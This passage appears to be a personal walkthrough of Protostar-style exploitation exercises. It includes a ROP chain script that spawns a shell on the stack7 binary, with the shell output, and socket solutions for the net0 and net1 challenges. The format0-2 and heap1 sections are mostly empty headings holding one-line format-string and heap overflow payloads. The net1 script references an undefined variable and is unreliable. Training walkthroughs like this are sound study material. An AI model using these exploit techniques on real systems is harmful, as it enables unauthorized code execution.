ubuntu     29686  0.0  0.0  10556  1608 pts/5    S+   13:13   0:00 grep --color=auto stack7
le91688:~/workspace/proto (master) $ cat /proc/29658/maps
08048000-08049000 r-xp 00000000 00:245 386                               /home/ubuntu/workspace/proto/stack7
08049000-0804a000 rwxp 00000000 00:245 386                               /home/ubuntu/workspace/proto/stack7
55555000-55575000 r-xp 00000000 00:245 9405                              /lib/i386-linux-gnu/ld-2.19.so
55575000-55576000 r-xp 0001f000 00:245 9405                              /lib/i386-linux-gnu/ld-2.19.so
55576000-55577000 rwxp 00020000 00:245 9405                              /lib/i386-linux-gnu/ld-2.19.so
55577000-55579000 r--p 00000000 00:00 0                                  [vvar]
55579000-5557a000 r-xp 00000000 00:00 0                                  [vdso]
5557a000-5557c000 rwxp 00000000 00:00 0 
5558e000-55736000 r-xp 00000000 00:245 9410   Target------------->       /lib/i386-linux-gnu/libc-2.19.so   
55736000-55737000 ---p 001a8000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
55737000-55739000 r-xp 001a8000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
55739000-5573a000 rwxp 001aa000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
5573a000-5573e000 rwxp 00000000 00:00 0 
fffdd000-ffffe000 rwxp 00000000 00:00 0  
```

So we have can see that our library libc-2.19.so is loaded in memory starting at 0x5558e000 and our binsh pointer value needs to be 0x556ee84c

We are starting to get a pile of info, but I promise it will all come together soon, beautifully!
Next, lets design our stack:
```asm
higher memory
+----------------------+
|   INT0x80            |  syscall should be "execve( "/bin/sh",0,0)
+----------------------+
|   add eax, 0xb ; ret |  add 0xb to EAX (to call execve with 11)
+----------------------+
|   xor eax,eax ; ret  |  ensure EAX is 0
+----------------------+
|   \x00\x00\x00\x00   |
+----------------------+
|   ptr to "/bin/sh/"  |  
+----------------------+
|pop $ecx,pop $ebx; ret|  load ECX with NULL and EBX with 'bin/sh'
+----------------------+
|  \x00\x00\x00\x00    |
+----------------------+
|   pop $edx, ret      |  load EDX with NULL
+----------------------+
|   EBP = "BBBB"       |  Our overflow
+----------------------+
|   filler A's         |  
---------------------- +
---lower memory---
```

Now we can put this all together with python

###Python script (ropchain.py):
```Python
#!/usr/bin/env python
from struct import pack

lib_base = 0x5558e000              #base of our library

syscall     = lib_base + 0x0002e725
zero_eax    = lib_base + 0x0002f0ec
set_eax     = lib_base + 0x001454c6
pop_ecx_ebx = lib_base + 0x000f9482
pop_edx     = lib_base + 0x00001aa2
binsh_loc   = 0x556ee84c
null_val    = '\x00\x00\x00\x00'

#struct pack returns a string containing values packed in a certain format
#'<I' makes them little endian unsigned int's
#see here for more details https://docs.python.org/2/library/struct.html

p = 'a'*76    #fill buffer          #build our stack
p += 'bbbb'    #overflow ebp
p += pack('<I', pop_edx)    #pop edx; ret
p += null_val               #EDX = 0
p += pack('<I', pop_ecx_ebx)    #pop ecx; ret
p += null_val
p += pack('<I', binsh_loc)
p += pack('<I', zero_eax)
p += pack('<I', set_eax)
p += pack('<I', syscall)
    
print (p)                          #for simplicity I just printed the value
```

Now we use our cat trick to keep stdin open and get our shell!

###winning command:
```bash
le91688:~/workspace/proto (master) $ ulimit -s unlimited   <--- ensure lib randomization is off
le91688:~/workspace/proto$ python ./ropchain.py 
le91688:~/workspace/proto$ (cat testrop; cat) | ./stack7
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXUaaaaaaaabbbbXU
ls
LIBCgadgets             format0          format3    heap4.asm    stack0.s          stack3exploit.py    ...
whoami
ubuntu
```

##net0
---------------------------------------
###Source Code:
```C
#include "../common/common.c"

#define NAME "net0"
#define UID 999
#define GID 999
#define PORT 2999

void run()
{
  unsigned int i;
  unsigned int wanted;

  wanted = random();

  printf("Please send '%d' as a little endian 32bit int\n", wanted);

  if(fread(&i, sizeof(i), 1, stdin) == NULL) {
      errx(1, ":(\n");
  }

  if(i == wanted) {
      printf("Thank you sir/madam\n");
  } else {
      printf("I'm sorry, you sent %d instead\n", i);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  /* Don't do this :> */
  srandom(time(NULL));

  run();
}
```

###Plan:
This challenge introduces some socket programming. 

###Python exploit:
```Python
import socket
import struct

target_host = "localhost"
target_port = 2999

#create socket obj
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connect the client
client.connect ( (target_host,target_port))

#recieve initial data
prompt = client.recv(4096)
#split by ' into list
data = prompt.split("'")
#grab the 2nd element, which is our target "random" value
value= data[1]
#send value packed as little endian unsigned int
client.send (struct.pack('<I',int(value))) #pack as little endian
#recieve data
response = client.recv(4096)

print response
```


##net1
---------------------------------------
###Source Code:
```C
#include "../common/common.c"

#define NAME "net1"
#define UID 998
#define GID 998
#define PORT 2998

void run()
{
  char buf[12];
  char fub[12];
  char *q;

  unsigned int wanted;

  wanted = random();         //generate random value for wanted

  sprintf(fub, "%d", wanted);  //cast wanted as string in fub

  if(write(0, &wanted, sizeof(wanted)) != sizeof(wanted)) {   //write 4 bytes of wanted
      errx(1, ":(\n");
  }

  if(fgets(buf, sizeof(buf)-1, stdin) == NULL) {              //fgets input from stdin
      errx(1, ":(\n");
  }

  q = strchr(buf, '\r'); if(q) *q = 0;
  q = strchr(buf, '\n'); if(q) *q = 0;

  if(strcmp(fub, buf) == 0) {                               //make sure they match
      printf("you correctly sent the data\n");
  } else {
      printf("you didn't send the data properly\n");
  }
}

int main(int argc, char **argv, char **envp)  #set up listener
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  /* Don't do this :> */
  srandom(time(NULL));

  run();
}
```

###Plan:
More socket programming with some value conversions 

###Python solution:
```Python
import socket
import struct

target_host = "localhost"
target_port = 2998
NULL= '\x00'

#create socket obj
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connect the client
client.connect ( (target_host,target_port))

#get wanted variable
wanted = client.recv(4096)
#unpack wanted as an unsigned int
unpacked = struct.unpack('=I',fub)

print "sending ", str(unpacked[0])
#cast the unsigned int as string and send
client.send (str(unpacked[0]) )
#add null byte just in case
client.send (NULL)

#get response
response = client.recv(4096)
print response
```



##Format0
---------------------------------------
###Source Code:
```C

```

###Plan:


###winning command:
```bash
./format0 $(python -c "print '%64d'+'\xef\xbe\xad\xde'")
```
###Python exploit:
```Python
```

##Format1
---------------------------------------
###Source Code:
```C

```

###Plan:


###winning command:
```bash
./format1 $(python -c 'print "\x38\x96\x04\x08"+"aaaaaaaaaa"+"%127$n"')
```
###Python exploit:
```Python
```


##Format2
---------------------------------------
###Source Code:
```C

```

###Plan:


###winning command:
```bash
python -c 'print "\xe4\x96\x04\x08"+"%59x."+"%4$n"' | ./format2
```
###Python exploit:
```Python
```


##Heap1
---------------------------------------
###Source Code:
```C

```

###Plan:


###winning command:
```bash
./heap1 $(python -c "print 'a'*20+'\x2c\xd6\xff\xff'") $(python -c "print '\x94\x84\x04\x08'") 
```
###Python exploit:
```Python
```
